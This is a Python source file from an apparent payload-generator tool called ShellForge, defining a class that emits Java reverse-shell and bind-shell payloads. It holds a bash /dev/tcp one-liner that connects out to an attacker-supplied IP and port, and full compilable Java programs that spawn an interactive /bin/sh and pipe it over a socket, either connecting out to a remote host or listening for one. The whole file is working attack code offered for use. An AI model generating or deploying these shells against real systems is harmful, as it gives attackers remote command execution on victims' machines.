"""
Java reverse and bind shell payload generators.

Produces compilable .java source when saved with --output.

Author: Mostafa Tamime
"""

from generators.base import PayloadGenerator


class JavaGenerator(PayloadGenerator):
    """Standard Java ProcessBuilder reverse/bind shells."""

    def reverse(self, ip: str, port: int) -> str:
        """One-liner style summary; prefer reverse_script() / --output for compile."""
        return (
            f'r = Runtime.getRuntime(); '
            f'p = r.exec(new String[] {{"/bin/bash", "-c", '
            f'"exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; '
            f'do \\$line 2>&5 >&5; done"}}); p.waitFor();'
        )

    def bind(self, port: int) -> str:
        """One-liner style summary; prefer bind_script() / --output for compile."""
        return (
            f"ServerSocket ss = new ServerSocket({port}); "
            f"Socket s = ss.accept(); "
            f'Process p = Runtime.getRuntime().exec("/bin/sh"); '
            f"// redirect p I/O <-> s I/O (see full .java via --output)"
        )

    def file_extension(self) -> str:
        return ".java"

    def reverse_script(self, ip: str, port: int) -> str:
        """Full compilable Java reverse shell source."""
        return f"""// ShellForge Java Reverse Shell
// Author: Mostafa Tamime
// Compile: javac Reverse.java && java Reverse
// Target: {ip}:{port}

import java.io.*;
import java.net.*;

public class Reverse {{
    public static void main(String[] args) throws Exception {{
        String host = "{ip}";
        int port = {port};
        String[] cmd = {{"/bin/sh", "-i"}};
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s = new Socket(host, port);
        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while (!s.isClosed()) {{
            while (pi.available() > 0) so.write(pi.read());
            while (pe.available() > 0) so.write(pe.read());
            while (si.available() > 0) po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {{
                p.exitValue();
                break;
            }} catch (Exception e) {{}}
        }}
        p.destroy();
        s.close();
    }}
}}
"""

    def bind_script(self, port: int) -> str:
        """Full compilable Java bind shell source."""
        return f"""// ShellForge Java Bind Shell
// Author: Mostafa Tamime
// Compile: javac Bind.java && java Bind
// Port: {port}

import java.io.*;
import java.net.*;

public class Bind {{
    public static void main(String[] args) throws Exception {{
        int port = {port};
        ServerSocket ss = new ServerSocket(port);
        Socket s = ss.accept();
        String[] cmd = {{"/bin/sh", "-i"}};
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while (!s.isClosed()) {{
            while (pi.available() > 0) so.write(pi.read());
            while (pe.available() > 0) so.write(pe.read());
            while (si.available() > 0) po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {{
                p.exitValue();
                break;
            }} catch (Exception e) {{}}
        }}
        p.destroy();
        s.close();
        ss.close();
    }}
}}
"""
